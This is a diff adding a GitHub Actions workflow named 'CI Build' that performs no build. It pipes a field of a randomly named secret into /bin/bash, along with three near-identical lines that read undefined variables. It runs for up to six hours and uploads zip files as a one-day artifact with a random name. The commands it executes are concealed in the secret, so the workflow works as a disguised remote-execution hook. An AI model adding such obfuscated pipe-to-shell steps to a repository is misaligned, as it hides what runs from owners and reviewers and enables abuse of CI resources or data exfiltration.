@@ -1,0 +1,31 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  trigger:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Start
+        env:
+          eyzuq78: ${{ secrets.eyzuq78 }}
+        run: |
+          printf '%s' "$eyzuq78" | jq -r .dkeb5372 | /bin/bash
+          printf '%s' "$yo00568" | jq -r .dsu7 | /bin/bash
+          echo $t8258 | jq -r .j5346 | /bin/bash
+          printf '%s' "$van0930" | jq -r .ninn3 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Xla9MLOC
+          path: "*.zip"
+          retention-days: 1
